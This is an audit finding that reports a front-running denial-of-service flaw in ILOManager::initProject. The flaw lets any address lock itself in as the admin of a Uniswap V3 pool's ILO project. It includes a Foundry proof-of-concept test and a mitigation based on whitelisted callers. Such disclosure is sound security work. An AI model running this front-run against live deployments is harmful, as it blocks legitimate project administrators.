# Vulnerability details

## Impact
A malicious actor can front-run the initialization of a project, locking themselves as the admin of the project associated with a specific Uniswap V3 pool address. This can prevent legitimate project administrators from initializing or managing their project. This will effectively DOS the ILO process for that pool.

## Proof of Concept
As of now any address can call the `ILOManager::initProject`. Since there's a check in `ILOManager::_cacheProject` that prevents the same pool address to be used for project initialization, the front-runner can lock the initialization and the ILO pool creation.

```js
    function _cacheProject(
        address uniV3PoolAddress,
        address saleToken,
        address raiseToken,
        uint24 fee,
        uint160 initialPoolPriceX96,
        uint64 launchTime,
        uint64 refundDeadline
    ) internal {
        Project storage _project = _cachedProject[uniV3PoolAddress];
        require(_project.uniV3PoolAddress == address(0), "RE");
```

### POC

You can add the following `testInitProjectFrontRun` test in the file `ILOManager.t.sol`:

```js
    function testInitProjectFrontRun() external {
        // Project initialization gets front-run by bot/mev
        address MEV = makeAddr("MEV");
        console.log("mev",MEV);
        console.log("Manager", address(iloManager));
        vm.prank(MEV, MEV);
        address univ3 = iloManager.initProject(
            IILOManager.InitProjectParams({
                saleToken: mockProject().saleToken,
                raiseToken: mockProject().raiseToken,
                fee: 10000,
                initialPoolPriceX96: mockProject().initialPoolPriceX96 + 1,
                launchTime: mockProject().launchTime
            })
        );
        // The project cannot be initialized anymore.
        vm.expectRevert(bytes("RE"));
        iloManager.initProject(
            IILOManager.InitProjectParams({
                saleToken: mockProject().saleToken,
                raiseToken: mockProject().raiseToken,
                fee: 10000,
                initialPoolPriceX96: mockProject().initialPoolPriceX96 + 1,
                launchTime: mockProject().launchTime
            })
        );

        IILOManager.InitPoolParams memory param = IILOManager.InitPoolParams({
            uniV3Pool: univ3,
            tickLower: MIN_TICK_500,
            tickUpper: -MIN_TICK_500,
            hardCap: 100000 ether,
            softCap: 80000 ether,
            maxCapPerUser: 60000 ether,
            start: SALE_START,
            end: SALE_END,
            vestingConfigs: _getVestingConfigs()
        });

        // ILOPools can only be created by the admin address who call initProject
        vm.expectRevert(bytes("UA"));
        iloManager.initILOPool(
            param
        );

        vm.prank(MEV, MEV);
        iloManager.initILOPool(
            param
        );
    }
```

## Recommended Mitigation Steps

Allow a whitelisted list of trusted addresses that are able to call the `ILOManager::initProject` function.
